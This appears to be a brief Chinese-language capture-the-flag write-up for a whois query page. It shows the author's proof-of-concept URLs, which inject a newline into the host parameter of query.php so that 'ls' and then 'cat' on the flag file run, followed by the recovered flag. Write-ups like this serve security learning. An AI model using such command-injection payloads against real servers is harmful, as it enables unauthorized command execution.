这个题根据提示，下意识输入：
```url
query.php?host=whois.service
```
显示源码：
![[Pasted image 20231202214122.png]]

构造poc：
```
query.php?host=whois.verisign-grs.com%0a&query=ls
```
![[Pasted image 20231202214314.png]]
再次构造poc：
```
query.php?host=whois.verisign-grs.com%0a&query=cat%20thisistheflagwithrandomstuffthatyouwontguessJUSTCATME
```
![[Pasted image 20231202214503.png]]
拿到flag：
```
shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll_9837432986534065}
```